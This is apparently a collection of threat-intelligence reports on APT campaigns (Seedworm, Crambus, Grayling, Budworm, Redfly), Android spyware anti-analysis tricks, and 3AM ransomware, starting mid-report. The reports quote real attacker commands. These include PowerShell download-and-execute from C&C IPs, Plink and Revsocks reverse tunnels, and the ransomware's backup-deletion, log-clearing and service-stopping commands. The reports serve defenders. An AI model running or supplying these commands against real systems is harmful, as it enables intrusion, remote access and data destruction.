by security software, as they are unused and not relevant. Right after this execution, attackers launched the MuddyC2Go malware using a scheduled task that had previously been created: \"CSIDL_SYSTEM\\schtasks.exe\" /run /tn \"Microsoft\\Windows\\JavaX\\Java Autorun\" The attackers also used some typical commands related to the Impacket WMIExec hacktool: cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1698662615.0451615 2>&1 The SimpleHelp remote access tool was also leveraged, connecting to the 146.70.124[.]102 C&C server. Further PowerShell stager execution also occurred, while the attacker also executed the Revsocks tool: CSIDL_COMMON_APPDATA\\do.exe -co 94.131.3.160:443 -pa super -q The attackers also used a second legitimate remote access tool, AnyDesk, which was deployed on the same computer as Revsocks and SimpleHelp, while PowerShell executions related to MuddyC2Go also occurred on the same machine: $uri =\"http://45.150.64.39:443/HJ3ytbqpne2tsJTEJi2D8s0hWo172A0aT\";$response = Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex $response. Content; Notably, this organization is believed to have previously been infiltrated by Seedworm earlier in 2023. The primary activity of note during that intrusion was extensive use of SimpleHelp to carry out a variety of activity, including: During that intrusion, it’s believed the attackers used WMI to launch the SimpleHelp installer on the victim network. At the time, this activity couldn’t be definitively linked to Seedworm, but this subsequent activity appears to show that the earlier activity was carried out by the same group of attackers. In another telecommunications and media company targeted by the attackers, multiple incidents of SimpleHelp were used to connect to known Seedworm infrastructure. A custom build of the Venom Proxy hacktool was also executed on this network, as well as the new custom keylogger used by the attackers in this activity. In the third organization targeted, Venom Proxy was also used, in addition to AnyDesk and suspicious Windows Scripting Files (WSF) that have been associated with Seedworm activity in the past. The most interesting part of the toolset used in this activity is probably the presence of the MuddyC2Go launcher, which was sideloaded by jabswitch.exe. The malware reads the C&C URL from the Windows registry value “End” stored inside the key “HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Tcpip”. The URL path is read from the “Status” value in the same aforementioned key. Lastly, the MuddyC2GO launcher executes the following PowerShell command to contact its C&C server and execute the PowerShell code received: powershell.exe -c $uri ='{C2_URI}';$response = Invoke-WebRequest -UseBasicParsing -Uri $uri -Method GET -ErrorAction Stop;Write-Output $response. Content;iex $response. Content; The MuddyC2Go framework was first publicly written about ina blog published by Deep Instinct researchers on November 8, 2023. That blog documented its use in attacks on organizations in countries in the Middle East. The researchers said the framework may have been used by Seedworm since 2020. They also said that the framework, which is written in Go, has replaced Seedworm’s previous PhonyC2 C&C infrastructure. This replacement appears to have occurred after thePhonyC2 source code was leaked earlier in 2023. The full capabilities of MuddyC2Go are not yet known, but the executable contains an embedded PowerShell script that automatically connects to Seedworm’s C&C server, which eliminates the need for manual execution by an operator and gives the attackers remote access to a victim machine. Deep Instinct said it was able to link MuddyC2Go to attacks dating back to 2020 due to the unique URL patterns generated by the framework. It also said that the MuddyC2Go servers it observed were hosted at “Stark Industries”, which is a VPS provider that is known to host malicious activity. Other tools of note used in this activity included SimpleHelp, which is a legitimate remote device control and management tool, for persistence on victim machines. SimpleHelp isbelieved to have been used in attacks carried out by Seedworm since at least July 2022. Once installed on a victim device, SimpleHelp can constantly run as a system service, which makes it possible for attackers to gain access to the user’s device at any point in time, even after a reboot. SimpleHelp also allows attackers to execute commands on a device with administrator privileges. SimpleHelp is now strongly associated with Seedworm activity and the tool is installed on several of Seedworm’s servers. Venom Proxy isa publicly available toolthat is described as “a multi-hop proxy tool developed for penetration testers.” It is written in Go. It can be used to easily proxy network traffic to a multi-layer intranet, and easily manage intranet nodes. It has been associated with Seedworm since at least mid-2022, withMicrosoft describing it as Seedworm’s “tool of choice” in an August 2022 blog. Seedworm tends to use a custom build of Venom Proxy in its activity. Other tools used in this activity include: Seedworm has long had an interest in telecommunications organizations, as do many groups engaged in cyberespionage activities. However, its strong focus on African organizations in this campaign is notable as, while it has been known to target organizations in Africa in the past, it does generally primarily focus on organizations in countries in the Middle East. That one of the victim organizations in this campaign is based in Egypt is also of note given Egypt’s proximity to Israel, a frequent target of Seedworm. Seedworm appears to remain focused on using a wide array of living-off-the-land and publicly available tools in its attack chains, no doubt in an effort to remain undetected on victim networks for as long as possible. However, its recent more wide adoption of new C&C infrastructure in the form of MuddyC2Go is notable and shows that the group continues to innovate and develop its toolset when required in order to keep its activity under the radar. While the group uses a lot of living-off-the-land and publicly available tools, it is also capable of developing its own custom tools, such as the custom build of Venom Proxy and the custom keylogger used in this campaign. The group still makes heavy use of PowerShell and PowerShell-related tools and scripts, underlining the need for organizations to be aware of suspicious use of PowerShell on their networks. The activity observed by Symantec’s Threat Hunter Team took place in November 2023, showing that Seedworm is very much a currently active threat faced by organizations that may be of strategic interest to Iranian threat actors.

    "text": "With the surging popularity of mobile applications, the landscape of cybersecurity is encountering increasingly intricate and discreet forms of malicious software. One common strategy in the realm of cybersecurity is code obfuscation. This practice involves the deliberate alteration of various elements within the code, such as variables, functions, and class names, rendering them virtually indecipherable. This not only poses a formidable challenge for anyone attempting to discern their purpose from their names but also significantly amplifies the complexity involved in decompilation. Recently, our attention was caught by a Spyware cluster, which has employed a series of ingenious techniques to heighten the difficulties associated with static analysis. These methods, which we will discuss below, draw inspiration from diverse sources, some originating from resilient services and others from various \"tools\" at the disposal of these unscrupulous actors. The world of mobile application security is rife with inventive techniques for concealing essential resources within APK files, the containers that hold Android applications. One such strategy involves creating directories within the APK that share the same names and permissions as vital resources. Figure 1 provides a visual representation of this approach. This technique presents complications for various analysis tools. For instance, Jadx, a popular decompiler for Android applications, can encounter problems when attempting to extract the AndroidManifest.xml file from these disguised directories. Figure 2 shows the wrong extraction in Jadx. Another sneaky method involves hiding critical resources within an APK using an unsupported compression method for the local file header, while employing the correct compression method in the central directory file header. Figure 3 is the snapshot of deceptive compression code. This deceptive maneuver also leads to issues with certain tools, including third-party libraries, causing them to malfunction. Figure 4 shows the error messages printed from the tools. Nonetheless, Android can manage this effectively because it can retrieve the “correct” compression method from the central directory file header. Exploring further within these covert techniques, we encounter the intriguing utilization of \"no compression\" data. Android currently supports both the no compression mode and the standard deflate compression mode (as shown in Figure 6). Traditionally, in Android's mapping, the no compression entry is represented as zero and begins with “00 00” (as seen in Figure 7). However, what piqued our interest is the presence of obfuscated entry codes within this spyware cluster (as displayed in Figures 8 and 9). Despite these unique entry codes, these spyware variants can still be installed on Android devices. Android's support for both the no compression and standard deflate compression methods is pivotal in managing these scenarios. For higher Android versions that employ APK signature schemes V2 and V3, the system adeptly handles \"no compression\" even when faced with unsupported compression entry codes in both file headers. This seamless handling ensures the smooth installation of APKs, despite the presence of obfuscated entry codes (as evident in Figure 10). Then this group of spywares makes use of the design, and specifies them to support APK signature schemes V2 and V3 only (Figure 11, 12). We can see the V2 and V3 signatures schemes as well as the APK signature block number for V2+ (Figure 13). By doing so, these spywares effectively shield themselves from static analysis by various commonly used tools. For example, Apktool may falter in decoding due to the usage of a non-standard compression method (Figure 14). Zipping libraries like Unzip and 7z may struggle to extract files, as they strictly adhere to the legal ZIP format (Figure 15). Jadx may also face challenges when dealing with files manipulated in this manner (Figure 16). “Obfuscated” AndroidManifest.xml and resources.arsc files can disrupt reverse engineering tools. With invalid attributes and illegal resource IDs, for example, the Android system doesn't parse illegal resource ID numbers, so while adding such a redundant attribute may not affect the APK's regular functionality, it can still cause issues with reverse engineering tools like Apktool, Jadx, JEB, etc. (Figure 17). The spyware cluster, along with its variants, goes to great lengths to conceal its true identity by masquerading as well-known games, popular apps, and even system-level applications. Among the list of decoys are prominent names like Play Store, Google TV, Google Meet, Google Translate, Chrome, YouTube, Netflix, TikTok, Discord, Spotify, Angry Birds, Facebook Lite, Instagram, , Disney+, Snapchat, and Android Settings. To further enhance their deception, they engage in app repackaging, essentially dressing themselves up as these widely recognized apps to appear even more convincing to unsuspecting users. When an unsuspecting user installs and opens one of these misleading applications, it will persistently seek accessibility permissions (as depicted in Figure 19). While this may appear innocuous, it is merely the beginning of a more complex operation. Through interactions with the user interface, these apps discreetly secure sensitive permissions and disable power optimization, as demonstrated in GIF 1. Although the default servers are not valid so far. To gather additional data and simulate the responses necessary to trigger malicious behaviors, we set up a mock server. The deceptive apps send fundamental app data, system information, and configuration details to this server and await further instructions (Figure 21). Moreover, once granted accessibility access, these apps can monitor and report a user's application activities to a designated server (Figure 22). All this activity is transmitted to the server after being encrypted (Figure 23). Let's delve into the intricacies of the C&C sections. These sections intentionally introduce noise, including junk code and irrelevant strings, into essential methods such as communication and command parsing (Figure 24). Their aim is to disrupt the functioning of static analysis tools like Jadx. By stripping away this noise, we can discern that the server's response adheres to a specific format (Figure 25). The length components have variable lengths and end with '0', while the data content incorporates commands with GZIP compression. The command handler AsyncTask is awaiting valid commands to be delivered from the server after launching the application (Figure 26). Once we remove the noise from the command parser code, it becomes evident that it possesses substantial capabilities. We listed a few of them in Table 1. To verify our findings, we employed a toast alert and sendSMS command for testing purposes. The commands delivered by our mock server were executed successfully (Figure 27). The spywares also have anti-killing/uninstalling methods to protect themselves. When the app detects that the user is trying to kill or uninstall itself through accessibility, it triggers the 'HOME' or 'BACK' action (Figure 28). In the realm of mobile application security, we've explored a range of deceptive tactics, including resource camouflage, compression trickery, signature scheme evasion, and resource obfuscation. These techniques pose challenges for users and defenders, making it crucial for security experts to understand these tactics to counter evolving threats effectively.

    "text": "The Iranian Crambus espionage group (aka OilRig, APT34) staged an eight-month-long intrusion against a government in the Middle East between February and September 2023. During the compromise, the attackers stole files and passwords and, in one case, installed a PowerShell backdoor (dubbed PowerExchange) that was used to monitor incoming mails sent from an Exchange Server in order to execute commands sent by the attackers in the form of emails, and surreptitiously forwarded results to the attackers. Malicious activity occurred on at least 12 computers and there is evidence that the attackers deployed backdoors and keyloggers on dozens more. In addition to deploying malware, the attackers made frequent use of the publicly available network administration tool Plink to configure port-forwarding rules on compromised machines, enabling remote access via the Remote Desktop Protocol (RDP). There is also evidence the attackers modified Windows firewall rules in order to enable remote access. Crambus is a long-running Iranian espionage group that has mounted operations against targets in multiple countries, including Saudi Arabia, Israel, the United Arab Emirates, Iraq, Jordan, Lebanon, Kuwait, Qatar, Albania, the U. S., and Turkey. The group is known to stage long-running intrusions for intelligence gathering and spying purposes. In recent years it has added a heavy social engineering component to the early stages of its attacks. It most recently came to attention last year, whenMicrosoft linked the groupto a destructive attack against the Albanian government. It assessed that Crambus was involved in gaining initial access and exfiltrating data from impacted networks. Wipers were likely then deployed by other Iran-linked actors. During this latest attack, Crambus deployed three previously undiscovered pieces of malware, along with the PowerExchange backdoor, a known backdoor that hadn’t yet been attributed to Crambus. In addition to malware, the attackers made use of a number of living-off-the-land and legitimate tools. The first evidence of malicious activity on the target’s network occurred on February 1, 2023, when an unknown PowerShell script (file name: joper.ps1) was executed from a suspicious directory: CSIDL_PROFILE\\public\\sat. The same script was executed multiple times on the same computer (Computer 1) over the next seven days. Four days later, on February 5, the attackers accessed a second computer (Computer 2) and a renamed version of Plink (msssh.exe), a command-line connection tool for the PuTTY SSH client, was used to configure port-forwarding rules allowing for RDP access from a remote host: CSIDL_PROFILE\\public\\sat\\msssh.exe 151.236.19[.]91 -P [REMOVED]-C -N -R 0.0.0.0:54231:127.0.0.1:3389 -l [REMOVED] -pw [REMOVED] This masqueraded Plink (mssh.exe) was executed repeatedly on this computer up until February 12. On February 21, malicious activity commenced on a web server (Web Server 1) when a netstat command was executed to retrieve a full list of all TCP and UDP connections. The netstat command line switches perform the following actions: Next, Plink (mssh.exe) was launched again to enable remote RDP access. After this occurred, there was evidence that a PowerShell script was used to mount the C: drive of another computer on the network. On April 8, the attackers gained access to a third computer (Computer 3), where another variant of Plink was executed from the %USERPROFILE%\\public directory and was used to forward port 3389 to port 999 on all available interfaces: CSIDL_PROFILE\\public\\plink.exe [REMOVED] -pw [REMOVED] -P [REMOVED] -2 -4 -T -N -C -R 0.0.0.0:999:127.0.0.1:3389 The options supplied in the command perform the following actions: At the same time, an unknown batch file was executed, which redirected output to a text file in the %USERPROFILE%\\public directory. cmd /c CSIDL_PROFILE\\public\\p2.bat > CSIDL_PROFILE\\public\\001.txt 2>&1 Immediately afterwards, the same Plink command was run a second time. This is followed by the same unknown batch script being executed several more times. Later that day, Mimikatz was executed from the %TEMP% directory to dump credentials. On April 9, another netstat command was run on a new compromised computer, the Domain Controller (Computer 4): The “o” option adds the process ID (PID) of the associated process that's using each network connection or listening port. The command will provide a list of all active network connections, both incoming and outgoing, along with the associated PID of the processes using those connections. Three hours later, Mimikatz was run again to dump credentials. The next day, April 10, an unknown windows batch file (file name: p.bat) was executed on Computer 3. This was followed by a Plink command: plink.exe ssh 78.47.218[.]106 1234qweRRR 443 10999 10.75.45.222 3389 The options perform the following actions: The command is used to set up a port forwarding tunnel from the compromised machine as a means to access the remote server’s RDP service as if it was running locally. On April 23, activity resumed on Computer 3, when previously unseen malware named Backdoor. Tokel (file name: telecomm.exe) was executed. On May 7, a suspicious PowerShell command was executed on the Domain Controller (Computer 4) to run an unknown script (file name: hwf.ps1). Malicious activity appeared to cease for nearly a month until June 4, when Backdoor. Tokel was executed again on Computer 3. On June 17, a suspicious PowerShell command was executed on the Domain Controller (Computer 4) in order to run another unknown script (file name: zone.ps1). On June 20, Backdoor. PowerExchange (file name: setapp.ps1) was run on Computer 3. The PowerShell-based backdoor is designed to execute commands received from the attackers. This is done by logging into compromised mailboxes on an Exchange Server and monitoring for incoming emails from the attackers. Email’s that contain “@@” in the subject line are read by Backdoor. PowerExchange and have the ability to execute commands received from the attackers, effectively using the Exchange Server as a C&C. The script allows four commands to execute: The attackers likely installed the script on an ordinary computer on the network in order to avoid raising suspicions created by anomalous network traffic, since internal connections to an Exchange Server are expected behavior. On July 1, the attackers once again utilized the masqueraded version of Plink to open a tunnel on Computer 3 by redirecting RDP to Port 12345 on any listening interface, effectively allowing external connections over RDP to the compromised machine. The next day, July 2, the attackers used netstat to list all open and listening TCP and UDP ports. It's possible the attackers were checking that the SSH tunnel was still active. On July 8, the attackers used the Domain Controller (Computer 4) to create a service on a remote host (10.75.45[.]222) to run an unknown script (file name: pl.bat). The service was configured to auto-start during the boot up process. Over the next two days, July 9 and 10, another new piece of malware named Trojan. Dirps (file name: virtpackage.exe) was repeatedly executed on Computer 3. On July 11, the attackers introduced more malicious tools to Computer 3, installing a third new piece of malware named Infostealer. Clipog (file name (poluniq.exe) which is used to capture keystrokes and steal clipboard contents. The next day (July 12) the attackers ran Mimikatz on the Domain Controller (Computer 4) to dump credentials. On July 15, the attackers again ran the unknown PowerShell script (zone.ps1) on the Domain Controller (Computer 4), followed by a second unknown script (copy.ps1). On July 18, the attackers again executed Infostealer. Clipog on Computer 3 before creating an SSH tunnel using Plink to access RDP services. This SSH tunnel was created again on August 3. On August 6, yet another unknown PowerShell script (file name: tnc.ps1) was executed on the Domain Controller (Computer 4). Immediately afterwards, Nessus vulnerability scans were observed, specially hunting for Log4j vulnerabilities on other machines on the network. While this could have been legitimate vulnerability scanning activity, not long afterwards netsh was executed to list all firewall rules. CSIDL_SYSTEM\\netsh.exe advfirewall firewall show rule name=[REMOVED] verbose Following this, another PowerShell script was executed. The script appeared to be designed to query and collect information about local user groups and their members on a Windows system. Its output was information about SIDs, names, object classes, and principal sources of local user groups and their members in a structured format. CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell -NoProfile -Command ;& {$j = sajb {$ErrorActionPreference = 'SilentlyContinue';$groups = Get-LocalGroup | Select-Object Name, Domain, SID;foreach($g in $groups){-join($g. SID,'|',$g. Name);$members = Get-LocalGroupMember -SID $g. SID | Select *;foreach($m in $members){-join(' ',$m. SID,'|',$m. Name,'|',$m. ObjectClass,'|',$m. PrincipalSource);}}};$r = wjb $j -Timeout 300; rcjb $j;}; After this, net.exe was used to list all mapped drives, before WMI (Windows Management Instrumentation) was used to execute Plink in order to open port-forwarding on the compromised host, allowing for remote RDP access. On August 7 and again on August 12, Plink was downloaded from the internet on to the Domain Controller (Computer 4) and saved as \\ProgramData\\Adobe.exe. On August 30, the attackers obtained access to a second web server (Web Server 2). They first used Plink to enable access to RDP on Port 12345 from their C&C server (91.132.92[.]90). They then installed Infostealer. Clipog using a different file name (fs-tool.exe). The next day, August 31, the attackers established a tunnel once again to open RDP access on Port 4455 from their C&C. Output was redirected to a text file (file name: 001.txt). There may have been some issues connecting as the attackers later attempted to create the same tunnel, this time using Port 12345. On September 1, the attackers shifted their attention to three more computers (Computer 5, Computer 6 and Computer 7), using Certutil to download Plink to each machine. They then executed an unknown PowerShell script (file name: joper.ps1) on Web Server 2. On September 2, the attackers ran the following netstat command on Web Server 2: This command is used to list all active connections. The unknown PowerShell script (file name: joper.ps1) was then run again. On September 3, the attackers once again ran joper.ps1 before two suspicious Wireshark commands were executed: ;CSIDL_SYSTEM_DRIVE\\program files\\wireshark\\extcap\\usbpcapcmd.exe; --extcap-interfaces --extcap-version=4.0 ;CSIDL_SYSTEM_DRIVE\\program files\\wireshark\\dumpcap.exe; -D -Z none Wireshark’s usbcapcmd utility was used to capture USB traffic on specified USB devices and save the captured data to a file. Similarly, dumpcap was used to capture network packets. It appears the attackers were interested in identifying any available network or USB interfaces from which they could capture packets on the machine. Immediately afterwards, a suspicious netstat command ran: This will list all active connections and print them to standard output in numerical form. After joper.ps1 was once again executed, the attackers turned their attention back to Computer 3, where they ran a number of reg.exe commands: reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f These commands were used to modify system configuration to enable Terminal Services (i.e. remote access) to the computer via RDP. A few hours later, a suspicious net.exe command was executed to mount the c$ share of another machine using stolen credentials. ;CSIDL_SYSTEM\\net.exe; use \\\\[REMOVED]\\c$ /user:[REMOVED] [REMOVED] On September 4, the attackers executed three different variants of the joper.ps1 script on Web Server 2. They then turned their attention back to Computer 1, where a new variant of the Backdoor. Tokel malware was installed on the computer. The next day, September 5 the attackers once again ran the joper.ps1 script on Web Server 2, while using net.exe to mount and unmount various network shares. They then executed Backdoor. Tokel on Computer 3 again before installing it on two more computers (Computer 9 and Computer 10). Malicious activity continued until September 9, with the attackers largely focusing their attention on Web Server 2, running the joper.ps1 script and mounting/unmounting network shares. Crambus is a long-running and experienced espionage group that has extensive expertise in carrying out long campaigns aimed at targets of interest to Iran. After a 2019 leak of its toolset, there was some speculation that Crambus may disappear. However, its activities over the past two years demonstrate that it represents a continuing threat for organizations in the Middle East and further afield.

    "text": "A previously unknown advanced persistent threat (APT) group used custom malware and multiple publicly available tools to target a number of organizations in the manufacturing, IT, and biomedical sectors in Taiwan. A government agency located in the Pacific Islands, as well as organizations in Vietnam and the U. S., also appear to have been hit as part of this campaign. This activity began in February 2023 and continued until at least May 2023. The Symantec Threat Hunter Team, part ofBroadcom, has attributed this activity to a new group we are calling Grayling. This activity stood out due to the use by Grayling of a distinctive DLL sideloading technique that uses a custom decryptor to deploy payloads. The motivation driving this activity appears to be intelligence gathering. There are indications that Grayling may exploit public facing infrastructure for initial access to victim machines. Web shell deployment was observed on some victim computers prior to DLL sideloading activity taking place. DLL sideloading is used to load a variety of payloads, including Cobalt Strike, NetSpy, and the Havoc framework. The attackers take various actions once they gain initial access to victims’ computers, including escalating privileges, network scanning, and using downloaders. Tactics, techniques, and procedures (TTPs) used by the attackers included: The typical attack chain in this activity appears to be DLL sideloading through exported API SbieDll_Hook. This leads to the loading of various tools, including a Cobalt Strike Stager that leads to Cobalt Strike Beacon, the Havoc framework, and NetSpy. The attackers were also seen loading and decrypting an unknown payload from imfsb.ini. An exploit for CVE-2019-0803 was also used in the course of this activity, while shellcode was also downloaded and executed. Other post-exploitation activity performed by these attackers includes using kill processes to kill all processes listed in a file called processlist.txt, and downloading the publicly available credential-dumping tool Mimikatz. While we do not see data being exfiltrated from victim machines, the activity we do see and the tools deployed point to the motivation behind this activity being intelligence gathering. The sectors the victims operate in – manufacturing, IT, biomedical, and government – are also sectors that are most likely to be targeted for intelligence gathering rather than for financial reasons. The use of custom techniques combined with publicly available tools is typical of the activity we see from APT groups these days, with threat actors often using publicly available or living-off-the-land tools in attempts to bypass security software and help their activity stay under the radar of defenders. Tools like Havoc and Cobalt Strike are also frequently used by attackers due to their wide array of capabilities. It is often easier for even skilled attackers to use existing tools like this than to develop custom tools of their own with similar capabilities. The use of publicly available tools can also make attribution of activity more difficult for investigators. The steps taken by the attackers, such as killing processes etc., also indicate that keeping this activity hidden was a priority for them.

    "text": "The Budworm advanced persistent threat (APT) group continues to actively develop its toolset. Most recently, the Threat Hunter Team in Symantec, part ofBroadcom, discovered Budworm using an updated version of one of its key tools to target a Middle Eastern telecommunications organization and an Asian government. Both attacks occurred in August 2023. Budworm (aka LuckyMouse, Emissary Panda, APT27) deployed a previously unseen variant of its SysUpdate backdoor (SysUpdate DLL inicore_v2.3.30.dll). SysUpdate is exclusively used by Budworm. As well as its custom malware, Budworm also used a variety of living-off-the-land and publicly available tools in these attacks. It appears the activity by the group may have been stopped early in the attack chain as the only malicious activity seen on infected machines is credential harvesting. Budworm executes SysUpdate on victim networks by DLL sideloading the payload using the legitimate INISafeWebSSO application. This technique has been used by the groupfor some time, with reports of INISafeWebSSO being leveraged dating as far back as 2018. DLL sideloading attacks use the DLL search order mechanism in Windows to plant and then invoke a legitimate application that executes a malicious payload. It can help attackers evade detection. SysUpdate is a feature-rich backdoor that has multiple capabilities, including: Trend Micro reported in March 2023that Budworm had developed a Linux version of SysUpdate with similar capabilities to the Windows version. SysUpdate has been in use by Budworm since at least 2020, and the attackers appear to continually develop the tool to improve its capabilities and avoid detection. As well as SysUpdate, the attackers used a number of legitimate or publicly available tools to map the network and dump credentials. Tools used by the attackers in this campaign included: Budworm is a long-running APT group that is believed to have been active since at least 2013. The attackers are known for their targeting of high-value victims, often focusing on organizations in the government, technology, and defense sectors. Budworm has targeted victims in many countries in Southeast Asia and the Middle East, among other locations, including the U. S. Symantec’s Threat Hunter Team published a blog in October 2022detailing how Budworm activity was seen on the network of a U. S. state legislature. In that campaign, the attackers also targeted the government of a Middle Eastern country, a multinational electronics manufacturer, and a hospital in Southeast Asia. The attackers also leveraged DLL sideloading in that campaign to load their HyperBro malware. The victims in this campaign — a government in Asia and a telecommunications company in the Middle East — do align with the kinds of victims we often see Budworm targeting. The targeting of a telecommunications company and government also point to the motivation behind the campaign being intelligence gathering, which is the motivation that generally drives Budworm activity. That Budworm continues to use a known malware (SysUpdate), alongside techniques it is known to favor, such as DLL sideloading using an application it has used for this purpose before, indicate that the group isn’t too concerned about having this activity associated with it if it is discovered. The use of a previously unseen version of the SysUpdate tool also demonstrates that the group is continuing to actively develop its toolset. The fact that this activity occurred as recently as August 2023 suggests that the group is currently active, and that those organizations that may be of interest to Budworm should be aware of this activity and the group’s current toolset.

    "text": "A new ransomware family calling itself 3AM has emerged. To date, the ransomware has only been used in a limited fashion. Symantec’s Threat Hunter Team, part of Broadcom, has seen it used in a single attack by a ransomware affiliate that attempted to deploy LockBit on a target’s network and then switched to 3AM when LockBit was blocked. 3AM is written in Rust and appears to be a completely new malware family. The ransomware attempts to stop multiple services on the infected computer before it begins encrypting files. Once encryption is complete, it attempts to delete Volume Shadow (VSS) copies. It is still unclear whether its authors have any links to known cybercrime organizations. The first suspicious activity from the threat actor involved the use of the gpresult command to dump the policy settings enforced on the computer for a specified user. The attacker also executed various Cobalt Strike components and tried to escalate privileges on the computer using PsExec. The attackers then ran reconnaissance commands such as whoami, netstat, quser, and net share, and tried to enumerate other servers for lateral movement with the quser and net view commands. They also added a new user for persistence and used the Wput tool to exfiltrate the victims’ files to their own FTP server. The attackers first attempted to use the LockBit ransomware but when that was blocked, they resorted to 3AM instead. The use of 3AM was only partially successful. The attackers only managed to deploy it to three machines on the organization's network and it was blocked on two of those three computers. 3AM is so-called because it appends encrypted files with the extension .threeamtime. The ransom note also makes reference to 3AM: Hello. \"3 am\" The time of mysticism, isn't it? All your files are mysteriously encrypted, and the systems \"show no signs of life\", the backups disappeared. But we can correct this very quickly and return all your files and operation of the systems to original state. All your attempts to restore data by himself will definitely lead to their damage and the impossibility of recovery. We are not recommended to you to do it on our own!!! (or do at your own peril and risk). There is another important point: we stole a fairly large amount of sensitive data from your local network: financial documents; personal information of your employees, customers, partners; work documentation, postal correspondence and much more. We prefer to keep it secret, we have no goal to destroy your business. Therefore can be no leakage on our part. We propose to reach an agreement and conclude a deal. Otherwise, your data will be sold to DarkNet/DarkWeb. One can only guess how they will be used. Please contact us as soon as possible, using Tor-browser: http://threeam7[REDACTED].onion/recovery [32 CHARS SPECIFIED BY -k COMMAND LINE PARAMETER] The ransomware is a 64-bit executable written in Rust and it recognises the following command-line parameters: The command-line parameters \"-m\" and \"-h\" are mutually exclusive. The usage of the “-h” and “-m” parameters and its values “local” and “net” are very similar to arguments used by Conti. When the malware is executed, it attempts to run the following commands, most of which attempt to stop various security and backup related software: \"netsh.exe\" advfirewall firewall set rule \"group=”Network Discovery”\" new enable=Yes \"wbadmin.exe\" delete systemstatebackup -keepVersions:0 -quiet \"wbadmin.exe\" DELETE SYSTEMSTATEBACKUP \"wbadmin.exe\" DELETE SYSTEMSTATEBACKUP -deleteOldest \"bcdedit.exe\" /set {default} recoveryenabled No \"bcdedit.exe\" /set {default} bootstatuspolicy ignoreallfailures \"wmic.exe\" SHADOWCOPY DELETE /nointeractive \"cmd.exe\" /c wevtutil cl security \"cmd.exe\" /c wevtutil cl system \"cmd.exe\" /c wevtutil cl application \"net\" stop /y xchange \"net\" stop /y acronis \"net\" stop /y AcronisAgent \"net\" stop /y AcrSch2Svc \"net\" stop /y Enterprise \"net\" stop /y VeeamTransportSvc \"net\" stop /y VeeamNFSSvc \"net\" stop /y DCAgent \"net\" stop /y EPSecurity \"net\" stop /y EPUpdate \"net\" stop /y EsgShKernel \"net\" stop /y FA_Scheduler \"net\" stop /y IISAdmin \"net\" stop /y Endpoint \"net\" stop /y McShield \"net\" stop /y Exchange \"net\" stop /y Monitor \"net\" stop /y Smcinst \"net\" stop /y SmcService \"net\" stop /y ccEvtMgr \"net\" stop /y ccSetMgr \"net\" stop /y TrueKey \"net\" stop /y tmlisten \"net\" stop /y UIODetect \"net\" stop /y NetMsmq \"net\" stop /y EhttpSrv \"net\" stop /y ESHASRV \"net\" stop /y klnagent \"net\" stop /y wbengine \"net\" stop /y mfefire \"net\" stop /y GxCIMgr \"net\" stop /y BackupExecVSSProvider \"net\" stop /y BackupExecManagementService \"net\" stop /y BackupExecJobEngine \"net\" stop /y BackupExecDiveciMediaService \"net\" stop /y BackupExecAgentBrowser \"net\" stop /y BackupExecAgentAccelerator \"net\" stop /y BacupExecRPCService \"net\" stop /y CASAD2WebSvc \"net\" stop /y CAARCUpdateSvc \"net\" stop /y YooBackup The ransomware will then scan the disk and any files matching predefined criteria are encrypted and the original files are deleted. The malware will then create the file \"RECOVER-FILES.txt\" in each scanned folder. This file contains the ransom note. The encrypted files contain a marker string \"0x666\" followed by the data appended by the ransomware. After encryption, the malware attempts to run the following command to delete volume shadow backup copies: vssadmin.exe delete shadows /all /quiet Ransomware affiliates have become increasingly independent from ransomware operators and this isnot the first time Symantec has seen an attacker attempt to deploy two different kinds of ransomwarein a single attack. New ransomware families appear frequently and most disappear just as quickly or never manage to gain significant traction. However, the fact that 3AM was used as a fallback by a LockBit affiliate suggests that it may be of interest to attackers and could be seen again in the future.

    "text": "Espionage actors are continuing to mount attacks on critical national infrastructure (CNI) targets, a trend that has become a source of concern for governments and CNI organizations worldwide. Symantec’s Threat Hunter Team has found evidence that a threat actor group Symantec calls Redfly used the ShadowPad Trojan to compromise a national grid in an Asian country for as long as six months earlier this year. The attackers managed to steal credentials and compromise multiple computers on the organization’s network. The attack is the latest in a series of espionage intrusions against CNI targets. In May 2023, the U. S., UK, Australian, Canadian, and New Zealand governmentsissued a joint alertabout threat actors targeting CNI organizations in the U. S. using techniques that could potentially be replicated against targets in other countries. The alert followedMicrosoft’s report on Volt Typhoon, an espionage actor that compromised several critical infrastructure organizations in the U. S. ShadowPad is a modular remote access Trojan (RAT) that was designed as a successor to the Korplug/PlugX Trojan, and was, for a period of time, sold in underground forums. However, despite its origins as a publicly available tool, it was only sold publicly for a very short time reportedly to a handful of buyers. It has since beenclosely linked to espionage actors. While ShadowPad is known to be used by multiple advanced persistent threat (APT) actors, identified tools and infrastructure used in the recent campaign targeting a national power grid overlaps with previously reported attacks attributed to a cluster of APT41 activity (aka Brass Typhoon, Wicked Panda, Winnti, and Red Echo). Symantec tracks this group under as multiple distinct actors such as Blackfly and Grayfly, where links between these groups have beendiscussed before. The activities identified in this campaign are currently being tracked under a separate group that Symantec has dubbed Redfly, which appears to exclusively focus on targeting CNI. A distinct variant of the ShadowPad Trojan was used in this attack. It utilized the domain websencl[.]com for command-and-control (C&C) purposes. It copied itself to disk in the following locations, masquerading as VMware files and directories to mask its purpose (there is no other evident association with VMware products): Persistence is achieved by creating the following service that is configured to start with Windows on boot-up: ServiceName: VMware Snapshot Provider Service DisplayName: VMware Snapshot Provider Service ServiceType: SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS StartType: 